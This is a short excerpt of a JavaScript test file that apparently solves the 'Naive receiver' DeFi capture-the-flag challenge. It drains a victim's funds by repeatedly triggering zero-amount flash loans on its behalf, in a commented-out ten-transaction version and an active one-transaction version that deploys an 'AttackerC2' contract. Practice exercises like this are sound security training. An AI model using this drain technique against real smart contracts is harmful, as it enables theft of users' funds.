...
describe('[Challenge] Naive receiver', function () {
  ...
  it('Exploit', async function () {
    ...
    // Solution using 10 txns

    // const promises = [];
    // for (let _ = 0; _ < 10; _++) {
    //     promises.push(this.pool.flashLoan(this.receiver.address, 0));
    // }
    // await Promise.all(promises);


    // Solution using a single txn

    await (await ethers.getContractFactory("AttackerC2")).deploy(this.pool.address, this.receiver.address);
  });
